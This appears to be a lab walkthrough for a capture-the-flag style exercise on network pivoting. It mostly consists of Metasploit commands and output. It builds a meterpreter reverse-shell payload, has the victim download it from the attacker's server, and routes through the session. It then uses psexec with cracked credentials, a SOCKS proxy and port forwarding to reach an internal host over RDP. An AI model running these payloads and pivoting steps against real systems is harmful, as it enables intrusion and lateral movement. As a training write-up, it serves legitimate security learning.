Questions
Follow steps from this section and find the flag on VM #2 (ITWK02) on the desktop of user luiza.

nc 192.168.195.223 4444
C:\Users\luiza>ipconfig
...
   IPv4 Address. . . . . . . . . . . : 192.168.195.223
   IPv4 Address. . . . . . . . . . . : 172.16.150.199
...

# Create payload using msfvenom
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.214 LPORT=443 -f exe -o met.exe

# start the http server for payload transferring
python3 -m http.server 80

# Upload the payload 
PS C:\Users\luiza> iwr -uri http://192.168.45.214/met.exe -Outfile met.exe

# Access to msfconsole
msfconsole
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
set LHOST tun0
run -j

msf6 exploit(multi/handler) > sessions -i 1
# Set to bg and add new route
msf6 exploit(multi/handler) > route add 172.16.150.0/24 1
[*] Route added
msf6 exploit(multi/handler) > route print
   172.16.150.0       255.255.255.0      Session 1
msf6 exploit(multi/handler) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.150.200
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
msf6 auxiliary(scanner/portscan/tcp) > run
...
[+] 172.16.150.200:       - 172.16.150.200:445 - TCP OPEN
[+] 172.16.150.200:       - 172.16.150.200:3389 - TCP OPEN
...

#  We'll attempt to use the psexec1 module to get access on the second target as user luiza. In the previous section, we retrieved the NTLM hash via Kiwi. Let's assume we could successfully crack the NTLM hash and the clear-text password is BoccieDearAeroMeow1!. For psexec to succeed, luiza has to be a local administrator on the second machine. For this example, let's also assume that we confirmed this through information gathering techniques.

# Let's use exploit/windows/smb/psexec and set SMBUser to luiza, SMBPass to BoccieDearAeroMeow1!, and RHOSTS to 172.16.5.200.

NOTE: Added route will only work with established connections. Because of this, the new shell on the target must be a bind shell such as windows/x64/meterpreter/bind_tcp, thus allowing us to use the set route to connect to it. A reverse shell payload would not be able to find its way back to our attacking system in most situations because the target does not have a route defined for our network.

msf6 auxiliary(scanner/portscan/tcp) > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set SMBUser luiza
msf6 exploit(windows/smb/psexec) > set SMBPass "BoccieDearAeroMeow1!"
msf6 exploit(windows/smb/psexec) > set RHOSTS 172.16.150.200
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > set LPORT 8000
msf6 exploit(windows/smb/psexec) > run
meterpreter > 
# shows that we successfully used the psexec exploit module to obtain a Meterpreter shell on the second target via the compromised machine.

# This is alternative methods in autoroute 
msf6 exploit(windows/smb/psexec) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options
...
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default
                                       )
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
...
msf6 post(multi/manage/autoroute) > sessions -l
msf6 post(multi/manage/autoroute) > set session 3
msf6 post(multi/manage/autoroute) > run
...
[+] Route added to subnet 172.16.150.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.195.0/255.255.255.0 from host's routing table.
...

# We could now use the psexec module as we did before, but we can also combine routes with the server/socks_proxy auxiliary module to configure a SOCKS2 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.

msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > show options
...
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on
                                       the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener
...

msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) >  run -j

# Open a new KALI shell
tail /etc/proxychains4.conf
...
socks5 127.0.0.1 1080
...
sudo proxychains xfreerdp /v:172.16.150.200 /u:luiza
Password: BoccieDearAeroMeow1!

# The xfreerdp client opens a new window providing us access to the GUI of ITWK02 in the internal network via RDP.

# Flag.txt
OS{69b45919702e2924ded4d15e808c787b}

# We can also use a similar technique for port forwarding using the portfwd command from inside a Meterpreter session, which will forward a specific port to the internal network.

msf6 exploit(multi/handler) > sessions 3
meterpreter > portfwd -h
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.150.200
[*] Forward TCP relay created: (local) :3389 -> (remote) 172.16.150.200:3389

# Lets try out the portfwd result
sudo xfreerdp /u:luiza /v:127.0.0.1   
Password: BoccieDearAeroMeow1!

# Succeed!!

# Using this technique, we are able to gain a remote desktop session on a host we were otherwise not able to reach from our Kali system. Likewise, if the second target machine was connected to an additional network, we could create a chain of pivots to reach further hosts.